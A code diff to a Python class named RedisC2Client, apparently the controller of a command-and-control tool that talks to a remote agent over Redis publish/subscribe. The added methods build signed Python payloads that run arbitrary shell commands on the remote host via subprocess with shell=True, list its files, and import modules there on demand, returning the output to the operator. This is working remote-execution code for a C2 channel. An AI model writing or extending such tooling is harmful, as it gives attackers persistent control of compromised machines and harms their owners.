@@ -82,6 +82,22 @@ class RedisC2Client:
         [mod] = args
         return f"globals().update({{{mod!r}:__import__({mod!r})}})"
 
+    def handle_ls(self, args):
+        return self.handle_sh(["ls", "-x"] + args)
+
+    def handle_ll(self, args):
+        return self.handle_sh(["ls", "-l"] + args)
+
+    def handle_sh(self, args):
+        if len(args) < 1:
+            return print("usage: sh COMMAND [ARG...]")
+        command = " ".join(args)
+        self._requires("subprocess")
+        return (f"subprocess.run({command!r},"
+                "stdout=subprocess.PIPE,"
+                "stderr=subprocess.STDOUT,"
+                "shell=True).stdout.decode('utf-8') or None")
+
     def _handle_user_command(self, command):
         result = command.strip()
         if not result:
@@ -91,6 +107,21 @@ class RedisC2Client:
         if func is not None:
             result = func(args[1:])
         return result
+
+    def _requires(self, *modules):
+        for module in modules:
+            if self._exec(f"{module!r} in globals()") != "False":
+                continue
+            self._import(module)
+
+    def _import(self, module):
+        result = self._exec(self.handle_import([module]))
+        if result is not None:
+            print(result)
+
+    def _exec(self, command):
+        self._send_signed(command)
+        return self._read_response()
 
     def _send_signed(self, request):
         self._send(self._sign(request.encode("utf-8")))
@@ -127,6 +158,7 @@ class RedisC2Client:
         return result
 
     def _send(self, data):
+        assert not self._awaiting_response
         self.db.publish(self.pub_chan, data)
         self._awaiting_response = True
 
